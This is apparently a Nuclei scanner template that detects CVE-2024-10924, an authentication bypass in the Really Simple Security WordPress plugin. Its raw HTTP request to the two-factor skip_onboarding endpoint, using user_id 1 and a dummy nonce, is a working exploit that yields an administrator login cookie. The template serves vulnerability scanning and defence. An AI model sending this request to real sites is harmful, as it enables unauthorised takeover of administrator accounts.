id: CVE-2024-10924

info:
  name: Really Simple Security < 9.1.2 authentication bypass
  author: yaser_s
  severity: critical
  description: |
    This template detects a vulnerability in the Really Simple SSL plugin's authentication bypass.
  reference:
    - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L277
    - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L278
    - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L67
    - https://plugins.trac.wordpress.org/changeset/3188431/really-simple-ssl
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/7d5d05ad-1a7a-43d2-bbbf-597e975446be?source=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10924
    cwe-id: CWE-288
    epss-score: 0.00045
    epss-percentile: 0.16991

http:
  - raw:
      - |
        POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: keep-alive
        Content-Length: 89

        {
            "user_id": 1,
            "login_nonce": "133333337",
            "redirect_to": "/wp-admin/"
        }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"redirect_to": "\\/wp-admin\\/"'
          - 'wordpress_logged_in'
      - type: regex
        regex:
          - 'wordpress_logged_in'
